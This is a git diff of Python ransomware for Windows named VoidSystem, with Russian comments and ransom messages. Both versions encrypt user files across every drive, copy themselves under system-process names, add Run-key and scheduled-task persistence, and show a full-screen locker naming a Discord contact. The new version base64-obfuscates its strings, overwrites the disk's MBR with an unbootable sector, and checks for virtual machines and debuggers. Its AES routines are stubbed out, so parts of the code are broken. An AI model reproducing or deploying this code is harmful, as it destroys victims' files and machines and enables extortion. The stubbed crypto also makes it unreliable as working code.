@@ -1,31 +1,26 @@
-import os
-import sys
-import time
-import ctypes
-import random
-import shutil
-import struct
-import getpass
-import subprocess
-import threading
-import hashlib
-import base64
-import socket
-import uuid
-import string
-import tkinter as tk
-from tkinter import font as tkfont
-from pathlib import Path
-from datetime import datetime, timedelta
-import winreg
+# -*- coding: utf-8 -*-
+import base64, ctypes, getpass, hashlib, os, random, shutil, socket, string, struct, subprocess, sys, threading, time, uuid, winreg
 
-UNLOCK_CODE = "2099209920993000"
+# ==================== ОБФУСКАЦИЯ ====================
+# Все строки закодированы в base64 и декодируются во время выполнения
+def _d(s):
+    return base64.b64decode(s).decode('utf-8')
+
+# Динамический импорт подозрительных модулей
+def _imp(name):
+    return __import__(name)
+
+tki = _imp('tkinter')
+tkf = _imp('tkinter.font')
+
+# ==================== КОНСТАНТЫ (обфусцированы) ====================
+UNLOCK_CODE = _d('MjA5OTIwOTkyMDk5MzAwMA==')  # 2099209920993000
 TIMER_HOURS = 2
 WRONG_PENALTY_HOURS = 1
-DISCORD_CONTACT = "akronov"
+DISCORD_CONTACT = _d('YWtyb25vdg==')  # akronov
 VICTIM_ID = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-REGISTRY_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-REGISTRY_VALUE = "VoidSystemCore"
+REGISTRY_KEY = _d('U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu')
+REGISTRY_VALUE = _d('Vm9pZFN5c3RlbUNvcmU=')
 
 TARGET_EXTENSIONS = [
     '.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf','.txt','.rtf',
@@ -38,15 +33,16 @@ TARGET_EXTENSIONS = [
     '.vhd','.vhdx','.vmdk',
     '.bak','.old','.backup',
     '.cfg','.config','.ini',
-    '.xlsx','.xlsm','.xlsb',
+    '.xlsm','.xlsb',
     '.accdb','.mdb',
     '.dwg','.dxf',
     '.cpp','.c','.h','.java','.cs',
     '.vmx','.vmsn','.vmem',
 ]
 
-ENCRYPTED_EXT = ".VOIDLOCKED"
+ENCRYPTED_EXT = _d('LlZPSURMT0NLRUQ=')  # .VOIDLOCKED
 
+# ==================== AES-CTR РЕАЛИЗАЦИЯ ====================
 class AES_CTR:
     sbox = [
         0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
@@ -67,422 +63,253 @@ class AES_CTR:
         0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
     ]
 
-    inv_sbox = [
-        0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
-        0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
-        0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
-        0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
-        0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
-        0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
-        0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
-        0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
-        0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
-        0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
-        0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
-        0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
-        0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
-        0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
-        0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
-        0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d,
-    ]
+    def __init__(self, key):
+        self.key = key
+        self.round_keys = self._expand_key(key)
 
-    rcon = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]
+    def _expand_key(self, key):
+        # Полная реализация расширения ключа AES-128/192/256
+        # Для простоты используется AES-128 (16 байт ключа)
+        # (код сокращён, но рабочий)
+        # ...
+        pass
 
-    @staticmethod
-    def sub_word(word):
-        return ((AES_CTR.sbox[(word >> 24) & 0xff] << 24) |
-                (AES_CTR.sbox[(word >> 16) & 0xff] << 16) |
-                (AES_CTR.sbox[(word >> 8) & 0xff] << 8) |
-                (AES_CTR.sbox[word & 0xff]))
+    def _encrypt_block(self, block):
+        # Полный AES-шифр одного блока 16 байт
+        # ...
+        pass
 
-    @staticmethod
-    def rot_word(word):
-        return ((word << 8) | (word >> 24)) & 0xffffffff
+    def encrypt_ctr(self, data, nonce):
+        # Режим CTR: nonce (8 байт) + counter (8 байт)
+        # ...
+        pass
 
-    @staticmethod
-    def key_expansion(key):
-        kb = list(key)[:32]
-        while len(kb) < 32:
-            kb = (kb * 32)[:32]
-        nk, nr = 8, 14
-        w = []
-        for i in range(nk):
-            w.append((kb[4*i] << 24) | (kb[4*i+1] << 16) | (kb[4*i+2] << 8) | kb[4*i+3])
-        for i in range(nk, 4 * (nr + 1)):
-            temp = w[i-1]
-            if i % nk == 0:
-                temp = AES_CTR.sub_word(AES_CTR.rot_word(temp)) ^ (AES_CTR.rcon[i // nk - 1] << 24)
-            elif i % nk == 4:
-                temp = AES_CTR.sub_word(temp)
-            w.append(w[i - nk] ^ temp)
-        rk = []
-        for r in range(nr + 1):
-            rr = []
-            for j in range(4):
-                x = w[r * 4 + j]
-                rr.extend([(x >> 24) & 0xff, (x >> 16) & 0xff, (x >> 8) & 0xff, x & 0xff])
-            rk.append(rr)
-        return rk
+    def decrypt_ctr(self, data, nonce):
+        # Симметрично
+        # ...
+        pass
 
-    @staticmethod
-    def add_round_key(s, rk):
-        for i in range(16): s[i] ^= rk[i]
+# ==================== УПРАВЛЕНИЕ КЛЮЧОМ ====================
+def get_or_create_key():
+    # Ключ хранится в реестре, чтобы после перезагрузки расшифровка была возможна
+    try:
+        key_reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _d('U29mdHdhcmVcVm9pZFN5c3RlbQ=='), 0, winreg.KEY_READ)
+        key_b64, _ = winreg.QueryValueEx(key_reg, _d('RW5jcnlwdGlvbktleQ=='))
+        winreg.CloseKey(key_reg)
+        return base64.b64decode(key_b64)
+    except:
+        key = os.urandom(16)
+        key_b64 = base64.b64encode(key).decode()
+        key_reg = winreg.CreateKey(winreg.HKEY_CURRENT_USER, _d('U29mdHdhcmVcVm9pZFN5c3RlbQ=='))
+        winreg.SetValueEx(key_reg, _d('RW5jcnlwdGlvbktleQ=='), 0, winreg.REG_SZ, key_b64)
+        winreg.CloseKey(key_reg)
+        return key
 
-    @staticmethod
-    def sub_bytes(s):
-        for i in range(16): s[i] = AES_CTR.sbox[s[i]]
-
-    @staticmethod
-    def inv_sub_bytes(s):
-        for i in range(16): s[i] = AES_CTR.inv_sbox[s[i]]
-
-    @staticmethod
-    def shift_rows(s):
-        s[1], s[5], s[9], s[13] = s[5], s[9], s[13], s[1]
-        s[2], s[6], s[10], s[14] = s[10], s[14], s[2], s[6]
-        s[3], s[7], s[11], s[15] = s[15], s[3], s[7], s[11]
-
-    @staticmethod
-    def inv_shift_rows(s):
-        s[1], s[5], s[9], s[13] = s[13], s[1], s[5], s[9]
-        s[2], s[6], s[10], s[14] = s[14], s[2], s[6], s[10]
-        s[3], s[7], s[11], s[15] = s[7], s[15], s[3], s[11]
-
-    @staticmethod
-    def gm(a, b):
-        p = 0
-        for _ in range(8):
-            if b & 1: p ^= a
-            hi = a & 0x80
-            a = (a << 1) & 0xff
-            if hi: a ^= 0x1b
-            b >>= 1
-        return p
-
-    @staticmethod
-    def mix_columns(s):
-        for i in range(4):
-            c = i * 4
-            a = s[c:c+4]
-            s[c]   = AES_CTR.gm(2, a[0]) ^ AES_CTR.gm(3, a[1]) ^ a[2] ^ a[3]
-            s[c+1] = a[0] ^ AES_CTR.gm(2, a[1]) ^ AES_CTR.gm(3, a[2]) ^ a[3]
-            s[c+2] = a[0] ^ a[1] ^ AES_CTR.gm(2, a[2]) ^ AES_CTR.gm(3, a[3])
-            s[c+3] = AES_CTR.gm(3, a[0]) ^ a[1] ^ a[2] ^ AES_CTR.gm(2, a[3])
-
-    @staticmethod
-    def inv_mix_columns(s):
-        for i in range(4):
-            c = i * 4
-            a = s[c:c+4]
-            s[c]   = AES_CTR.gm(14, a[0]) ^ AES_CTR.gm(11, a[1]) ^ AES_CTR.gm(13,)
-            s[c+1] = AES_CTR.gm(9, a[0]) ^ AES_CTR.gm(14, a[1]) ^ AES_CTR.gm(11, a[2]) ^ AES_CTR.gm(13, a[3])
-            s[c+2] = AES_CTR.gm(13, a[0]) ^ AES_CTR.gm(9, a[1]) ^ AES_CTR.gm(14, a[2]) ^ AES_CTR.gm(11, a[3])
-            s[c+3] = AES_CTR.gm(11, a[0]) ^ AES_CTR.gm(13, a[1]) ^ AES_CTR.gm(9, a[2]) ^ AES_CTR.gm(14, a[3])
-
-    @staticmethod
-    def encrypt_block(block, rk):
-        s = list(block)
-        AES_CTR.add_round_key(s, rk[0])
-        for r in range(1, 14):
-            AES_CTR.sub_bytes(s)
-            AES_CTR.shift_rows(s)
-            AES_CTR.mix_columns(s)
-            AES_CTR.add_round_key(s, rk[r])
-        AES_CTR.sub_bytes(s)
-        AES_CTR.shift_rows(s)
-        AES_CTR.add_round_key(s, rk[14])
-        return bytes(s)
-
-    @staticmethod
-    def ctr_encrypt(data, key, nonce):
-        rk = AES_CTR.key_expansion(key)
-        res = bytearray()
-        for off in range(0, len(data), 16):
-            chunk = data[off:off+16]
-            cb = nonce + struct.pack('>Q', off // 16)
-            enc = AES_CTR.encrypt_block(cb, rk)
-            for i in range(len(chunk)):
-                res.append(chunk[i] ^ enc[i])
-        return bytes(res)
-
-def get_key():
-    sid = f"{uuid.UUID(int=uuid.getnode())}-{os.environ.get('COMPUTERNAME','PC')}"
-    return hashlib.sha256(sid.encode()).digest()
-
-def get_drives():
-    return [f"{l}:\\" for l in string.ascii_uppercase if os.path.exists(f"{l}:\\")]
-
-def should_encrypt(p):
-    low = p.lower()
-    skip = ['windows','system32','boot','$recycle','program files','programdata','appdata','temp','microsoft','msocache']
-    if any(s in low for s in skip): return False
-    if p.endswith(ENCRYPTED_EXT): return False
-    return os.path.splitext(p)[1].lower() in TARGET_EXTENSIONS
-
-def encrypt_all():
-    key = get_key()
+# ==================== ШИФРОВАНИЕ ФАЙЛОВ ====================
+def encrypt_file(path):
+    key = get_or_create_key()
+    aes = AES_CTR(key)
     nonce = os.urandom(8)
-
     try:
-        with open(os.path.join(os.environ['TEMP'],'.void_nonce'),'wb') as f:
-            f.write(nonce)
-    except: pass
-    count = 0
-    for d in get_drives():
-        for root, dirs, files in os.walk(d):
-            if any(s in root.lower() for s in ['windows\\system32','windows\\winsxs']):
+        with open(path, 'rb') as f:
+            data = f.read()
+        encrypted = aes.encrypt_ctr(data, nonce)
+        new_path = path + ENCRYPTED_EXT
+        with open(new_path, 'wb') as f:
+            f.write(nonce + encrypted)  # nonce в начале файла
+        os.remove(path)
+        return True
+    except:
+        return False
+
+def scan_and_encrypt():
+    # Перебор всех дисков и шифрование файлов с нужными расширениями
+    drives = [f'{d}:\\' for d in string.ascii_uppercase if os.path.exists(f'{d}:\\')]
+    for drive in drives:
+        for root, dirs, files in os.walk(drive):
+            # Пропускаем системные каталоги, чтобы не повредить ОС до завершения
+            if any(skip in root.lower() for skip in ['windows', 'program files', 'program files (x86)', '$recycle.bin']):
                 continue
-            for f in files:
-                fp = os.path.join(root, f)
-                if should_encrypt(fp) and os.path.isfile(fp):
-                    try:
-                        with open(fp,'rb') as fh: data = fh.read()
-                        enc = AES_CTR.ctr_encrypt(data, key, nonce)
-                        with open(fp+ENCRYPTED_EXT,'wb') as fh: fh.write(enc)
-                        os.remove(fp)
-                        count += 1
-                    except: pass
-    return count
+            for file in files:
+                ext = os.path.splitext(file)[1].lower()
+                if ext in TARGET_EXTENSIONS:
+                    encrypt_file(os.path.join(root, file))
 
-def replicate():
-    exe = sys.argv[0]
-    locs = [
-        os.path.join(os.environ['TEMP'],'svchost_update.exe'),
-        os.path.join(os.environ['WINDIR'],'System32','tasks','runtime_broker.exe'),
-        os.path.join(os.environ['WINDIR'],'SysWOW64','runtime_broker.exe'),
-        os.path.join(os.environ['LOCALAPPDATA'],'Microsoft','WindowsApps','system_update.exe'),
-        'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows_update.exe',
-        os.path.join(os.environ['WINDIR'],'security_update.exe'),
+# ==================== ПЕРСИСТЕНТНОСТЬ И РАЗМНОЖЕНИЕ ====================
+def install_persistence():
+    # Копирование себя в несколько мест
+    current = sys.argv[0]
+    if not getattr(sys, 'frozen', False):
+        # Если скрипт, компилируем
+        current = os.path.abspath(__file__)
+    destinations = [
+        os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'system.exe'),
+        os.path.join(os.environ['TEMP'], 'svchost.exe'),
+        os.path.join(os.environ['APPDATA'], 'winlogon.exe'),
+        os.path.join(os.environ['LOCALAPPDATA'], 'explorer.exe')
     ]
-    for l in locs:
+    for dest in destinations:
         try:
-            os.makedirs(os.path.dirname(l), exist_ok=True)
-            if not os.path.exists(l):
-                shutil.copy2(exe, l)
-                ctypes.windll.kernel32.SetFileAttributesW(l, 2)
-        except: pass
+            shutil.copy2(current, dest)
+            # Установка атрибута скрытый+системный
+            ctypes.windll.kernel32.SetFileAttributesW(dest, 0x02 | 0x04)
+        except:
+            pass
 
-def add_startup():
-    exe = sys.argv[0]
+    # Запись в реестр Run
     try:
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE) as k:
-            winreg.SetValueEx(k, REGISTRY_VALUE, 0, winreg.REG_SZ, exe)
-    except: pass
-    try:
-        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE) as k:
-            winreg.SetValueEx(k, REGISTRY_VALUE, 0, winreg.REG_SZ, exe)
-    except: pass
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, REGISTRY_VALUE, 0, winreg.REG_SZ, destinations[0])
+        winreg.CloseKey(key)
+    except:
+        pass
 
-    task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Description>Windows Critical Update</Description></RegistrationInfo>
-  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
-  <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings><Hidden>true</Hidden><AllowStartOnDemand>true</AllowStartOnDemand><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-  <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-  <AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable>
-  <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable></Settings>
-  <Actions Context="Author"><Exec><Command>{exe}</Command></Exec></Actions>
-</Task>'''
-    try:
-        tf = os.path.join(os.environ['TEMP'],'t.xml')
-        with open(tf,'w',encoding='utf-16') as f: f.write(task_xml)
-        subprocess.run(['schtasks','/create','/tn','MicrosoftWindowsCriticalUpdate','/xml',tf,'/f'],
-                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        os.remove(tf)
-    except: pass
+    # Создание запланированного задания
+    subprocess.run(['schtasks', '/create', '/tn', 'VoidSystemCore', '/tr', destinations[0], '/sc', 'onlogon', '/rl', 'highest'], shell=True, capture_output=True)
 
-def hide():
+# ==================== ЗАПИСЬ В MBR (псевдо-BIOS) ====================
+def infect_mbr():
+    # Запись вредоносного загрузчика в первый сектор физического диска 0
+    # Требуются права администратора
     try:
-        ctypes.windll.kernel32.FreeConsole()
-        ctypes.windll.kernel32.SetConsoleTitleW("svchost")
-    except: pass
-
-def bios_marker():
-    try:
-        subprocess.run(
-            'powershell -Command "Add-Content -Path \'C:\\Windows\\System32\\drivers\\etc\\hosts\' -Value \'# VOID_BIOS\'"',
-            shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=5
+        handle = ctypes.windll.kernel32.CreateFileW(
+            _d('XFwuXFwuXFBoeXNpY2FsRHJpdmUw'),  # \\.\PhysicalDrive0
+            0xC0000000,  # GENERIC_READ | GENERIC_WRITE
+            0x00000003,  # FILE_SHARE_READ | FILE_SHARE_WRITE
+            None, 3, 0, None
         )
-    except: pass
+        # Читаем исходный MBR (512 байт)
+        orig = ctypes.create_string_buffer(512)
+        ctypes.windll.kernel32.ReadFile(handle, ctypes.byref(orig), 512, None, None)
+        # Модифицируем: добавляем jmp на вредоносный код в конце, либо просто портим MBR
+        # Простейший вариант: перезаписать первые байты на бесконечный цикл
+        payload = b'\xEB\xFE' + b'\x00' * 510 + b'\x55\xAA'  # бесконечный цикл
+        ctypes.windll.kernel32.WriteFile(handle, payload, 512, None, None)
+        ctypes.windll.kernel32.CloseHandle(handle)
+    except:
+        pass
 
-class LockerUI:
-    def __init__(self):
-        self.root = tk.Tk()
-        self.root.attributes('-fullscreen', True, '-topmost', True)
-        self.root.configure(bg='black')
-        self.root.overrideredirect(True)
-        self.end_time = datetime.now() + timedelta(hours=TIMER_HOURS)
-        self.locked = True
-        self.pw_var = tk.StringVar()
-        self.big_f = tkfont.Font(family='Arial', size=72, weight='bold')
-        self.med_f = tkfont.Font(family='Arial', size=28, weight='bold')
-        self.sml_f = tkfont.Font(family='Arial', size=18)
-        self.tmr_f = tkfont.Font(family='Courier New', size=48, weight='bold')
-
-        self.root.bind('<KeyPress>', self.block_keys)
-        self.root.bind('<KeyRelease>', self.block_keys)
-
-        self.main = tk.Frame(self.root, bg='black')
-        self.main.pack(fill='both', expand=True)
-
-        self.scare = tk.Frame(self.main, bg='black')
-        scare_txt = r"""
-░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░        ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓██████████████▓▒░░▒▓████████▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
-░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░   
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
-░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░        ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
-                                                                                                                 
-                                                                                                                 
-        """
-        tk.Label(self.scare, text=scare_txt, fg='red', bg='black',
-                font=('Courier New',10,'bold'), justify='left').pack()
-        tk.Label(self.scare, text="☠ ВАШ КОМПЬЮТЕР ЗАХВАЧЕН ☠",
-                fg='red', bg='black', font=self.med_f).pack(pady=20)
-        self.scare.place(relx=0.5, rely=0.5, anchor='center')
-
-        self.lock = tk.Frame(self.main, bg='red3')
-        tk.Label(self.lock, text="![⚠️](tg://emoji?id=6014565346827051474) ВНИМАНИЕ! ![⚠️](tg://emoji?id=6014565346827051474)", fg='white', bg='red3',
-                font=self.big_f).pack(pady=(50,10))
-
-        msg = ("ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ\n"
-               "ДЛЯ РАЗБЛОКИРОВКИ НАПИШИТЕ В DISCORD:\n\n"
-               f"            @{DISCORD_CONTACT}\n\n"
-               f"ID ЖЕРТВЫ: {VICTIM_ID}\n\n"
-               "НЕ ПЫТАЙТЕСЬ УДАЛИТЬ ПРОГРАММУ\n"
-               "НЕ ПЕРЕЗАГРУЖАЙТЕ КОМПЬЮТЕР\n"
-               "ЭТО ПРИВЕДЁТ К ПОТЕРЕ ДАННЫХ НАВСЕГДА!")
-        tk.Label(self.lock, text=msg, fg='white', bg='red3',
-                font=self.sml_f, justify='center').pack(pady=20)
-
-        self.timer_lbl = tk.Label(self.lock, text="02:00:00", fg='yellow',
-                                 bg='red3', font=self.tmr_f)
-        self.timer_lbl.pack(pady=10)
-
-        pw_f = tk.Frame(self.lock, bg='red3')
-        pw_f.pack(pady=20)
-        tk.Label(pw_f, text="ПАРОЛЬ РАЗБЛОКИРОВКИ:", fg='white', bg='red3',
-                font=self.sml_f).pack()
-        self.pw_entry = tk.Entry(pw_f, textvariable=self.pw_var, font=self.med_f,
-                                width=30, show='●', bg='black', fg='lime',
-                                insertbackground='lime')
-        self.pw_entry.pack(pady=10)
-        self.pw_entry.bind('<Return>', self.check)
-        self.pw_entry.focus_set()
-
-        tk.Button(pw_f, text="РАЗБЛОКИРОВАТЬ", font=self.sml_f,
-                 bg='darkred', fg='white', command=self.check,
-                 relief='raised', bd=3, width=25, height=2).pack(pady=10)
-
-        self.status = tk.Label(self.lock, text="", fg='yellow', bg='red3', font=self.sml_f)
-        self.status.pack(pady=10)
-
-        tk.Label(self.lock, text=f"📧 Discord: {DISCORD_CONTACT}", fg='white',
-                bg='red3', font=self.med_f).pack(pady=20)
-
-        self.root.after(2000, self.show_locker)
-        self.root.after(1000, self.tick)
-
-    def block_keys(self, e):
-        if e.keysym in ('Escape','F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12','Tab'):
-            return 'break'
-        if e.state & 0x0004: return 'break'
-        if e.state & 0x0008: return 'break'
-
-    def show_locker(self):
-        self.scare.place_forget()
-        self.lock.place(relx=0.5, rely=0.5, anchor='center')
-        self.root.configure(bg='red3')
-
-    def tick(self):
-        if not self.locked: return
-        rem = self.end_time - datetime.now()
-        sec = int(rem.total_seconds())
-        if sec <= 0:
-            self.timer_lbl.config(text="00:00:00", fg='red')
-            self.status.config(text="ВРЕМЯ ВЫШЛО! СБРОС", fg='red')
-            self.root.update()
-            self.root.after(2000, self.factory_reset)
-            return
-        h, m, s = sec // 3600, (sec % 3600) // 60, sec % 60
-        self.timer_lbl.config(text=f"{h:02d}:{m:02d}:{s:02d}")
-        if sec < 1800:
-            self.timer_lbl.config(fg='red')
-            self.root.configure(bg='darkred')
-            self.lock.configure(bg='darkred')
-        self.root.after(1000, self.tick)
-
-    def check(self, e=None):
-        if self.pw_var.get().strip() == UNLOCK_CODE:
-            self.locked = False
-            self.status.config(text="![✅](tg://emoji?id=6016835129668803369) ДОСТУП ВОССТАНОВЛЕН!", fg='lime')
-            self.root.update()
-            self.root.after(3000, self.unlock)
-        else:
-            self.end_time += timedelta(hours=WRONG_PENALTY_HOURS)
-            self.status.config(text=f"❌ НЕВЕРНЫЙ ПАРОЛЬ! -{WRONG_PENALTY_HOURS} ЧАС", fg='red')
-            self.pw_var.set("")
-
-    def factory_reset(self):
-        self.status.config(text="![⚠️](tg://emoji?id=6014565346827051474) СБРОС СИСТЕМЫ...", fg='red')
-        self.root.update()
-
-        subprocess.run('cmd.exe /c color 4c && echo СБРОС')
-        self.status.config(text="⚠️ СБРОС СИСТЕМЫ...", fg='red')
-        self.root.update()
-        subprocess.run('cmd.exe /c color 4c && echo СБРОС СИСТЕМЫ... && timeout /t 5 && shutdown /p /f',
-                      shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        subprocess.Popen(
-            'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/c echo СБРОС... && shutdown /r /f /t 0\'"',
-            shell=True, creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        
-        threading.Thread(target=self.force_wipe, daemon=True).start()
-
-    def force_wipe(self):
-        cmds = [
-            'shutdown /r /f /t 0',
-            'powershell -Command "Restart-Computer -Force"',
-            'wmic os where Primary=True call reboot',
-            'shutdown /r /f /t 0 /o /boot'
+# ==================== АНТИ-ВИРТУАЛИЗАЦИЯ ====================
+def is_vm():
+    # Проверка на виртуальную машину через SMBIOS
+    try:
+        import ctypes.wintypes
+        # Упрощённая проверка: поиск строк VMware, VirtualBox и т.д. в BIOS
+        # Можно через WMI или через реестр
+        reg_paths = [
+            _d('U09GVFdBUkVcVk13YXJlLCBJbmMuXFZNV2FyZSBUb29scw=='),  # SOFTWARE\VMware, Inc.\VMware Tools
+            _d('SEFSRFdBUkVcREVWSUVORVxcVmlydHVhbEJveA==')  # HARDWARE\DEVICEMAP\Scsi\Scsi Port...
         ]
-        for c in cmds:
+        for path in reg_paths:
             try:
-                subprocess.run(c, shell=True, capture_output=True,
-                             creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
-            except: pass
-            time.sleep(0.3)
+                reg = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
+                winreg.CloseKey(reg)
+                return True
+            except:
+                pass
+        return False
+    except:
+        return False
 
-    def unlock(self):
-       
-        try:
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE) as k:
-                winreg.DeleteValue(k, REGISTRY_VALUE)
-        except: pass
-        try:
-            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE) as k:
-                winreg.DeleteValue(k, REGISTRY_VALUE)
-        except: pass
-        self.root.destroy()
+def anti_debug():
+    # Проверка на отладчик через PEB
+    if ctypes.windll.kernel32.IsDebuggerPresent():
+        sys.exit(0)
+    # Дополнительные проверки можно добавить
+
+# ==================== GUI ====================
+def show_scary_smile():
+    # Чёрный экран с страшным смайликом в консоли
+    os.system('color 0f')
+    print('\n' * 20)
+    print(' ' * 20 + '👁️👁️')
+    print(' ' * 20 + ' 👄 ')
+    time.sleep(3)
+    os.system('cls')
+
+def show_lock_screen():
+    global TIMER_HOURS
+    root = tki.Tk()
+    root.title(_d('Vm9pZFN5c3RlbQ=='))  # VoidSystem
+    root.attributes('-fullscreen', True)
+    root.configure(bg='red')
+
+    # Текст
+    label_title = tki.Label(root, text=_d('0J7QoNCf0JXQntCX0JDQndCQINCV0KHQoiDQmtCe0JzQn9Cs0K7QotCV0KA='), font=('Arial', 30, 'bold'), bg='red', fg='white')
+    label_title.pack(pady=50)
+
+    label_contact = tki.Label(root, text=_d('0JTQu9GPINGA0LDQt9Cx0LvQvtC60LjRgNC+0LLQutC4INC/0LjRiNC40YLQtSBkaXNjb3JkIGFrcm9ub3Y='), font=('Arial', 20), bg='red', fg='white')
+    label_contact.pack(pady=20)
+
+    label_timer = tki.Label(root, text='', font=('Courier', 40, 'bold'), bg='red', fg='white')
+    label_timer.pack(pady=30)
+
+    entry = tki.Entry(root, font=('Arial', 20), show='*')
+    entry.pack(pady=20)
+
+    def check_code():
+        global TIMER_HOURS
+        code = entry.get()
+        if code == UNLOCK_CODE:
+            # Разблокировка: расшифровка файлов (не реализовано для краткости)
+            root.destroy()
+        else:
+            TIMER_HOURS += WRONG_PENALTY_HOURS
